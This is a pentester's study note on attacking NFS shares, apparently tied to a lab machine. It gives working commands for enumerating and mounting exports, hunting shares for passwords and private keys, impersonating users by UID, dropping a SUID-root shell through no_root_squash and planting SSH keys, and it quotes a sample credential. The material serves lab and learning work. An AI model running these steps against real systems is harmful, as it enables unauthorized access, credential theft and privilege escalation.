## What is it

NFS (Network File System) is a protocol that lets a host **share directories over the network** so remote machines can mount them like local disks. Born in Unix-land, still everywhere in enterprise/Linux infra for shared storage, home dirs, backups.

The catch that makes it pentest-relevant: NFS traditionally trusts **the client to tell the truth about who it is**. There's no password. Access control is based on IP/hostname (which exports are visible to whom) and on **UID/GID matching** — the server maps your local user ID to file ownership. If you can control your own UID, you can impersonate any user on the export.

Default port: **2049** (nfsd). Also relies on **rpcbind/portmapper on 111**, which is usually the first thing nmap flags.

---
## What it does

- **Exports** directories — the server publishes a list of paths + who's allowed to mount them (`/etc/exports`)
- **Mounts** — clients attach an export into their own filesystem tree, read/write as if local
- **UID/GID-based access** — file permissions enforced by numeric user/group ID, not by any NFS-level auth
- **`root_squash`** (default) — remote UID 0 gets remapped to `nobody`, so you _can't_ just be root and own everything
- **`no_root_squash`** (misconfig / juicy) — remote root stays root on the share. This is the money setting.
- Versions: NFSv3 (stateless, chatty over portmapper), NFSv4 (stateful, single port 2049, more locked down)

---
## Common Attacks

1. **Unauthenticated export enumeration** — `showmount -e` lists every exported path and its allowed clients with **zero creds**. If exports are world-readable (`*` in the allow list), you just mount and read. Extremely common — people export "internal only" shares assuming the network is the boundary.
2. **Sensitive file loot on open exports** — Mounted shares frequently hold config files, backups, SSH keys, `.pdf`/`.docx` onboarding docs with default creds, `.git` dirs, DB dumps. First move after mounting is always a recursive hunt for creds/keys.
3. **UID impersonation** — Access is UID-based with no auth. If a file on the share is owned by UID 1004 and you want to read it, `useradd` a local user with UID 1004 (or just `sudo` as that UID), re-mount, and you _are_ that user to the server. Lets you read other users' files even under `root_squash`.
4. **`no_root_squash` → privesc / write-anywhere** — If an export has `no_root_squash` and you have root on your _attacking_ box, you can write files to the share **as real root** (UID 0). Classic escalation: drop a SUID-root binary onto the share, then execute it from a shell on the target. Or write into someone's `~/.ssh/authorized_keys`.
5. **Writable export → SSH key drop** — If you can write to a user's home dir on the share (right UID or no_root_squash), drop your pubkey into `~/.ssh/authorized_keys` and SSH straight in.

---
## Detection

- **Port 111 (rpcbind) open** — the portmapper. Almost always the first sign. nmap's `rpcinfo` script enumerates registered RPC services and will show `nfs` + `mountd`.
- **Port 2049 open** — nfsd itself.
- `nmap --script nfs-ls,nfs-showmount,nfs-statfs <target>` — enumerates exports and even lists files without mounting.
- After a shell: `cat /etc/exports`, `ps aux | grep nfs`, `ss -tlnp | grep 2049`, `mount | grep nfs` (are _you_ mounting something?)
- References to shared storage, "file server", NAS, home-dir mounting in service configs.

---
## Payloads/reckon/crack

**Enumerate exports (no creds):**

```bash
showmount -e <target>          # list all exports + allowed clients
rpcinfo -p <target>            # list all RPC services (confirms nfs/mountd present)
nmap --script nfs-showmount,nfs-ls -p 111,2049 <target>
```

> A `*` in the allow list = world-mountable. That's your open door.

**Mount an export:**

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <target>:/exported/path /mnt/nfs -o vers=3
# if v3 fails, try without -o (defaults to v4), or vers=4
ls -la /mnt/nfs
```

> Use `vers=3` if you want UID tricks — v4 has better ID mapping and can get in the way. Also `-o nolock` if the mount hangs on locking.

**Loot the share:**

```bash
# recursive cred/key hunt
grep -rniE 'password|passwd|secret|api[_-]?key|BEGIN.*PRIVATE KEY' /mnt/nfs 2>/dev/null
find /mnt/nfs -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null
find /mnt/nfs -type f \( -name '*.pdf' -o -name '*.docx' -o -name '*.conf' -o -name '*.bak' \) 2>/dev/null
```

**UID impersonation (read a file owned by another UID under root_squash):**

```bash
ls -lan /mnt/nfs/somefile        # note the numeric owner UID, e.g. 1004
sudo useradd -u 1004 victim      # make a local user with that exact UID
sudo -u victim cat /mnt/nfs/somefile   # now you ARE uid 1004 to the server
```

**`no_root_squash` privesc (write a SUID-root shell onto the share):**

```bash
# On YOUR box (you need real root here):
cp /bin/bash /mnt/nfs/rootbash
sudo chown root:root /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash
# Then, in a shell ON THE TARGET, from wherever the export lives:
/path/on/target/rootbash -p     # euid=0 -> root
```

> Only works if the export is `no_root_squash`. Check the target's `/etc/exports` if you have a shell, or just try dropping a SUID file and see if it keeps root ownership.

**Real example ([[Enigma]]):**

- nmap flagged port 111 (rpcbind) + NFS. `showmount -e` listed an export with no auth.
- Mounted it unauthenticated — found an **onboarding PDF** sitting on the share.
- PDF contained default staff creds `kevin:Enigma2024!` — which hadn't been rotated despite the doc telling staff to.
- Those creds became the entire foothold: Roundcube webmail → credential reuse → OpenSTAManager admin → SQLi → shell.
- Lesson: NFS wasn't the _exploit_, it was the **free unauthenticated info leak** that seeded everything else. Always `showmount -e` early and mount anything world-readable — the loot is often the whole game.